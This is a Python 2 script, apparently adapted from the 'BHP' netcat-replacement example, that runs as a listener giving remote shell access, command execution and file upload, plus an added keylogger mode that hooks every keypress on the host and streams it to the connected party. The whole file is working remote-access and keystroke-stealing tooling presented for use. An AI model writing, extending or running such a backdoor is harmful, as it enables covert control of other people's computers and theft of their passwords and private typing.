#!/usr/local/bin/python2
import sys
import socket
import getopt
import threading
import subprocess
import keyboard

# define some global variables
listen = False
command = False
upload = False
keylog = False
execute = ""
target = ""
upload_destination = ""
port = 0

# this runs a command and returns the output
def run_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    return output

# keylogger function
def keylogger(client_socket):
    def capture_keystrokes(event):
        client_socket.send(event.name.encode() + "\n")
    keyboard.on_press(capture_keystrokes)
    keyboard.wait()

# this handles incoming client connections
def client_handler(client_socket):
    global upload, execute, command, keylog

    if len(upload_destination):
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:
        while True:
            client_socket.send("<BHP:#> ")
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            response = run_command(cmd_buffer)
            client_socket.send(response)
    
    if keylog:
        keylogger(client_socket)

# this is for incoming connections
def server_loop():
    global target, port

    if not len(target):
        target = "0.0.0.0"
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    print "listen mode"

    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

# client sender
def client_sender():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        while True:
            response = client.recv(4096)
            if not response:
                break
            sys.stdout.write(response)
    except:
        print "[*] Exception! Exiting."
    client.close()

# usage function
def usage():
    print "Netcat Replacement"
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run - execute the given file upon receiving a connection"
    print "-c --command - initialize a command shell"
    print "-u --upload=destination - upon receiving connection upload a file and write to [destination]"
    print "-k --key - enable keylogger mode"
    sys.exit(0)

# main function
def main():
    global listen, port, execute, command, upload_destination, target, keylog
    
    if not len(sys.argv[1:]):
        usage()
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:k", ["help", "listen", "execute", "target", "port", "command", "upload", "key"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("-k", "--key"):
            keylog = True
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:
        client_sender()
    
    if listen:
        server_loop()

main()
